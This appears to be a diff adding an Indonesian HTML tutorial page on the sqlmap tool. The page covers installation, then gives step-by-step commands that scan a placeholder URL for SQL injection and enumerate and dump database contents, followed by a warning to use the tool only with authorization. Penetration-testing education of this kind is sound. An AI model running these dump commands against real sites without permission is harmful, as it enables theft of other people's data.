@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>Panduan Sqlmap - CodeForker</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body data-theme="light">
+    <header class="header" data-theme="light">
+        <div class="menu-toggle" onclick="goBack()">
+            <i class="fas fa-arrow-left"></i>
+        </div>
+        <p2>SQLmap</p2>
+    </header>
+    <div class="tutorial-container">
+        <section class="tutorial-section">
+        	<div class="thumbnail">
+    <img src="img/sqlmap.png" alt="Thumbnail" width="320" height="180">
+</div>
+            <h2>📘 Apa itu Sqlmap?</h2>
+            <p>Sqlmap adalah alat penetrasi open-source canggih yang digunakan untuk mendeteksi dan mengeksploitasi kerentanan SQL Injection dalam berbagai sistem database. SQL Injection adalah teknik serangan yang mengeksploitasi celah keamanan dalam aplikasi web untuk memanipulasi database di baliknya.</p>
+        </section>
+        <section class="tutorial-section">
+            <h2>🛠️ Instalasi</h2>            
+            <h3>Termux</h3>
+            <div class="code-snippet">
+                <button class="copy-btn" onclick="copyCode(this)">
+                    <i class="fas fa-copy"></i>
+                </button>
+                <pre><code>pkg update && pkg upgrade -y
+pkg install python3 git -y
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python3 sqlmap.py -h</code></pre>
+            </div>
+            <h3>Linux (Ubuntu/Debian)</h3>
+            <div class="code-snippet">
+                <button class="copy-btn" onclick="copyCode(this)">
+                    <i class="fas fa-copy"></i>
+                </button>
+                <pre><code>sudo apt update
+sudo apt install sqlmap -y</code></pre>
+            </div>
+        </section>
+        <section class="tutorial-section">
+            <h2>🔍 Penggunaan Dasar</h2>
+            
+            <h3>Cek Versi</h3>
+            <div class="code-snippet">
+                <button class="copy-btn" onclick="copyCode(this)">
+                    <i class="fas fa-copy"></i>
+                </button>
+                <pre><code>sqlmap --version</code></pre>
+            </div>
+            <h3>Scan URL untuk SQL Injection</h3>
+            <div class="code-snippet">
+                <button class="copy-btn" onclick="copyCode(this)">
+                    <i class="fas fa-copy"></i>
+                </button>
+                <pre><code>sqlmap -u "http://contoh.com/halaman.php?id=1" --batch</code></pre>
+            </div>
+            <h3>Ekstrak Daftar Database</h3>
+            <div class="code-snippet">
+                <button class="copy-btn" onclick="copyCode(this)">
+                    <i class="fas fa-copy"></i>
+                </button>
+                <pre><code>sqlmap -u "http://contoh.com/halaman.php?id=1" --dbs --batch</code></pre>
+            </div>
+            <h3>Ekstrak Daftar Tabel dari Database</h3>
+            <div class="code-snippet">
+                <button class="copy-btn" onclick="copyCode(this)">
+                    <i class="fas fa-copy"></i>
+                </button>
+                <pre><code>sqlmap -u "http://contoh.com/halaman.php?id=1" -D nama_database --tables --batch</code></pre>
+            </div>
+            <h3>Ekstrak Kolom dari Tabel Tertentu</h3>
+            <div class="code-snippet">
+                <button class="copy-btn" onclick="copyCode(this)">
+                    <i class="fas fa-copy"></i>
+                </button>
+                <pre><code>sqlmap -u "http://contoh.com/halaman.php?id=1" -D nama_database -T nama_tabel --columns --batch</code></pre>
+            </div>
+            <h3>Ekstrak Data dari Kolom Tertentu</h3>
+            <div class="code-snippet">
+                <button class="copy-btn" onclick="copyCode(this)">
+                    <i class="fas fa-copy"></i>
+                </button>
+                <pre><code>sqlmap -u "http://contoh.com/halaman.php?id=1" -D nama_database -T nama_tabel -C kolom1,kolom2 --dump --batch</code></pre>
+            </div>
+        </section>
+        <section class="tutorial-section">
+            <h2>⚠️ Peringatan Penting</h2>
+            <div class="warning-box">
+                <p><strong>Perhatian!</strong> Sqlmap hanya boleh digunakan untuk:</p>
+                <ul>
+                    <li>Pengujian keamanan dengan izin resmi</li>
+                    <li>Kegiatan penetrasi yang sah</li>
+                    <li>Evaluasi kerentanan sistem milik sendiri</li>
+                </ul>
+                <p>Penggunaan tanpa izin adalah pelanggaran hukum dan dapat dikenakan sanksi pidana!</p>
+            </div>
+        </section>
+    </div>
+    <script src="main.js"></script>
+</body>
+</html>
